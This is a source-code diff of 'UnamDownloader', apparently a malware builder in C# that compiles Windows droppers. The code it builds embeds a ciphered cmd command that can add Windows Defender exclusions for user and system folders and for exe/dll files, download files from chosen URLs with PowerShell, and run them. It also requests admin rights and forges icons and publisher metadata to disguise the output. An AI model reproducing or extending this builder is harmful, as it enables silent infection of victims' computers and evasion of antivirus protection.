@@ -22,102 +22,83 @@ namespace UnamDownloader
             InitializeComponent();
         }
 
-        private void Form1_Load(object sender, EventArgs e)
-        {
-            radioNative.Checked = true;
-        }
-
-        public void ManagedCompiler(string savePath)
-        {
-            var providerOptions = new Dictionary<string, string>();
-            providerOptions.Add("CompilerVersion", "v4.0");
-            CompilerParameters parameters = new CompilerParameters();
-            string compilerOptions = " /target:winexe /platform:AnyCPU /optimize+ ";
-
-            StringBuilder loaderbuilder = new StringBuilder(Properties.Resources.Program);
-
-            if (checkAdmin.Checked)
-            {
-                System.IO.File.WriteAllBytes(savePath + ".manifest", Properties.Resources.administrator);
-                compilerOptions += " /win32manifest:\"" + savePath + ".manifest" + "\"";
-                loaderbuilder.Replace("DefAdmin", "true");
-            }
-
-            if (vanity.checkIcon.Checked && vanity.txtIconPath.Text.Trim().Length > 0)
-            {
-                compilerOptions += " /win32icon:\"" + vanity.txtIconPath.Text.Trim() + "\"";
-            }
-
-            parameters.GenerateExecutable = true;
-            parameters.OutputAssembly = savePath;
-            parameters.CompilerOptions = compilerOptions;
-            parameters.IncludeDebugInformation = false;
-            parameters.ReferencedAssemblies.Add("System.dll");
-            parameters.ReferencedAssemblies.Add("System.Core.dll");
-
-            loaderbuilder.Replace("#DATA", Convert.ToBase64String(Encoding.ASCII.GetBytes(CreateCommand())));
-            loaderbuilder.Replace("DefDebug", "false");
-            loaderbuilder.Replace("%Guid%", Guid.NewGuid().ToString());
-
-            if (vanity.checkAssembly.Checked)
-            {
-                loaderbuilder.Replace("DefAssembly", "true");
-                loaderbuilder.Replace("%Title%", vanity.txtAssemblyTitle.Text);
-                loaderbuilder.Replace("%Description%", vanity.txtAssemblyDescription.Text);
-                loaderbuilder.Replace("%Company%", vanity.txtAssemblyCompany.Text);
-                loaderbuilder.Replace("%Product%", vanity.txtAssemblyProduct.Text);
-                loaderbuilder.Replace("%Copyright%", vanity.txtAssemblyCopyright.Text);
-                loaderbuilder.Replace("%Trademark%", vanity.txtAssemblyTrademark.Text);
-                loaderbuilder.Replace("%v1%", vanity.txtAssemblyVersion1.Text);
-                loaderbuilder.Replace("%v2%", vanity.txtAssemblyVersion2.Text);
-                loaderbuilder.Replace("%v3%", vanity.txtAssemblyVersion3.Text);
-                loaderbuilder.Replace("%v4%", vanity.txtAssemblyVersion4.Text);
-            }
-
-            var results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(parameters, loaderbuilder.ToString());
-            if (results.Errors.HasErrors)
-            {
-                foreach(var error in results.Errors)
-                {
-                    MessageBox.Show(error.ToString(), "Error when building downloader!", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
-            }
-            if (checkAdmin.Checked)
-            {
-                System.IO.File.Delete(savePath + ".manifest");
-            }
-        }
-
         public void NativeCompiler(string savePath)
         {
             string currentDirectory = Path.GetDirectoryName(savePath);
             string filename = Path.GetFileNameWithoutExtension(savePath) + ".c";
-            using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
+
+            string compilerDirectory = Path.Combine(currentDirectory, "Compiler");
+            if (!Directory.Exists(compilerDirectory))
             {
-                archive.ExtractToDirectory(currentDirectory);
+                using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
+                {
+                    archive.ExtractToDirectory(compilerDirectory);
+                }
+                using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.MinGW64)))
+                {
+                    archive.ExtractToDirectory(compilerDirectory);
+                }
             }
-            if (checkAdmin.Checked)
-            {
-                System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "manifest.o"), Properties.Resources.manifest);
-            }
+
             StringBuilder sb = new StringBuilder(Properties.Resources.Program1);
+
+            bool buildResource = (checkAdmin.Checked || vanity.checkIcon.Checked || vanity.checkAssembly.Checked);
+
+            if (buildResource)
+            {
+                StringBuilder resource = new StringBuilder(Properties.Resources.resource);
+                string defs = "";
+                if (vanity.checkIcon.Checked)
+                {
+                    resource.Replace("#ICON", vanity.txtIconPath.Text);
+                    defs += " -DDefIcon";
+                }
+                if (checkAdmin.Checked)
+                {
+                    System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "administrator.manifest"), Properties.Resources.administrator);
+                    defs += " -DDefAdmin";
+                }
+                if (vanity.checkAssembly.Checked)
+                {
+                    resource.Replace("#TITLE", vanity.txtAssemblyTitle.Text);
+                    resource.Replace("#DESCRIPTION", vanity.txtAssemblyDescription.Text);
+                    resource.Replace("#COMPANY", vanity.txtAssemblyCompany.Text);
+                    resource.Replace("#PRODUCT", vanity.txtAssemblyProduct.Text);
+                    resource.Replace("#COPYRIGHT", vanity.txtAssemblyCopyright.Text);
+                    resource.Replace("#TRADEMARK", vanity.txtAssemblyTrademark.Text);
+                    resource.Replace("#VERSION", string.Join(",", new string[] { vanity.txtAssemblyVersion1.Text, vanity.txtAssemblyVersion2.Text, vanity.txtAssemblyVersion3.Text, vanity.txtAssemblyVersion4.Text }));
+                    defs += " -DDefAssembly";
+                }
+                System.IO.File.WriteAllText(Path.Combine(currentDirectory, "resource.rc"), resource.ToString());
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = Path.Combine(compilerDirectory, "MinGW64\\bin\\windres.exe"),
+                    Arguments = "--input resource.rc --output resource.o -O coff -F pe-i386 " + defs,
+                    WorkingDirectory = currentDirectory,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                }).WaitForExit();
+                System.IO.File.Delete(Path.Combine(currentDirectory, "resource.rc"));
+                System.IO.File.Delete(Path.Combine(currentDirectory, "administrator.manifest"));
+            }
+
             string key = RandomString(32);
             string command = "cmd " + CreateCommand();
-            sb.Replace("#COMMAND", ToLiteral(Cipher(command, key)).Replace("\" +", "\" \\"));
-            sb.Replace("#KEY", key);
+            sb.Replace("#COMMAND", ToLiteral(Cipher(command, key)));
             sb.Replace("#LENGTH", command.Length.ToString());
+            sb.Replace("#KEY", key);
 
             System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), sb.ToString());
             Process.Start(new ProcessStartInfo
             {
-                FileName = Path.Combine(currentDirectory, "tinycc\\tcc.exe"),
-                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (checkAdmin.Checked ? "manifest.o" : "") + " -luser32 -m32",
+                FileName = Path.Combine(compilerDirectory, "tinycc\\tcc.exe"),
+                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (buildResource ? "resource.o" : "") + " -luser32 -m32",
                 WorkingDirectory = currentDirectory,
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
-            System.IO.File.Delete(Path.Combine(currentDirectory, "manifest.o"));
+
+            System.IO.File.Delete(Path.Combine(currentDirectory, "resource.o"));
             System.IO.File.Delete(Path.Combine(currentDirectory, filename));
-            Directory.Delete(Path.Combine(currentDirectory, "tinycc"), true);
         }
 
         public string CreateCommand()
@@ -130,19 +111,19 @@ namespace UnamDownloader
             {
                 File filevar = ((File)listFiles.Items[i]);
                 string droplocation = (filevar.comboDropLocation.Text == "Current Directory" ? "($pwd).path" : "$env:" + filevar.comboDropLocation.Text);
-                downloads.Add(string.Format(@"powershell (New-Object System.Net.WebClient).DownloadFile('{0}', (Join-Path -Path {1} -ChildPath '{2}'))", filevar.txtDownloadURL.Text, droplocation, filevar.txtFilename.Text));
+                downloads.Add(string.Format(@"powershell ""(New-Object System.Net.WebClient).DownloadFile('{0}', (Join-Path -Path {1} -ChildPath '{2}'))""", filevar.txtDownloadURL.Text, droplocation, filevar.txtFilename.Text));
                 if (filevar.toggleExecute.Checked)
                 {
-                    executes.Add(string.Format(@"powershell Start-Process -FilePath (Join-Path -Path {0} -ChildPath '{1}')", droplocation, filevar.txtFilename.Text));
+                    executes.Add(string.Format(@"powershell ""Start-Process -FilePath (Join-Path -Path {0} -ChildPath '{1}')""", droplocation, filevar.txtFilename.Text));
                 }
             }
-            return ("/c " + (checkWD.Checked ? "powershell -Command Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit").Replace(@"\", @"\\").Replace("\"", "\\\"");
+            return ("/c " + (checkWD.Checked ? "powershell -Command Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit");
         }
 
-        public string RandomString(int length)
+        public static string RandomString(int length)
         {
-            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789";
-            const int clength = 35;
+            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789!$&()*+,-./:<=>@[]^_";
+            const int clength = 55;
             var buffer = new char[length];
             for (var i = 0; i < length; ++i)
             {
@@ -237,25 +218,13 @@ namespace UnamDownloader
 
             if (save.Length > 0)
             {
-                if (radioNative.Checked)
-                {
-                    NativeCompiler(save);
-                }
-                else
-                {
-                    ManagedCompiler(save);
-                }
+                NativeCompiler(save);
             }
         }
 
         private void btnVanity_Click(object sender, EventArgs e)
         {
             vanity.Show();
-        }
-
-        private void radioNative_CheckedChanged(object sender)
-        {
-            btnVanity.Visible = !radioNative.Checked;
         }
     }
 }
